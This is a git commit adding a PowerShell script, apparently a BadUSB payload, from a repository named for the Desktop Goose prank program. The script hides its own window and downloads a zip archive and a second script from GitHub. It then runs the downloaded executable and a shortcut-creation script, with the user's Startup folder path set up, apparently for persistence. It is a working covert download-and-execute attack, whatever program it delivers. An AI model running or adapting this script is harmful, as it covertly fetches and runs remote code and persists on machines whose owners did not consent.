c812e196c747fece7b217ccc6c32c1826d0fe8c9
Jf0-2 <102773107+Jf0-2@users.noreply.github.com>
2022-06-10 20:28:25 -0600

    Add files via upload

---
+++ main.ps1
@@ -0,0 +1,19 @@
+$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $t -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+
+$startupFolder = "C:\Users\$Env:username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+$saveFolder = "C:\Users\$Env:username\goose"
+
+New-Item -Path $saveFolder -ItemType Directory
+
+Invoke-WebRequest "https://github.com/Jf0-2/Desktop-Goose-BAD-USB/raw/main/DesktopGoose.zip" -OutFile "$saveFolder\DesktopGoose.zip"
+Expand-Archive -LiteralPath "$saveFolder\DesktopGoose.zip" -DestinationPath "$saveFolder\DesktopGoose"
+
+Remove-Item "$saveFolder\DesktopGoose.zip"
+
+Invoke-WebRequest "https://github.com/Jf0-2/Desktop-Goose-BAD-USB/raw/main/createShortcut.ps1" -OutFile "$saveFolder\createShortcut.ps1"
+
+Start-Process powershell "$saveFolder\createShortcut.ps1"
+
+& "$saveFolder\DesktopGoose\GooseDesktop.exe"
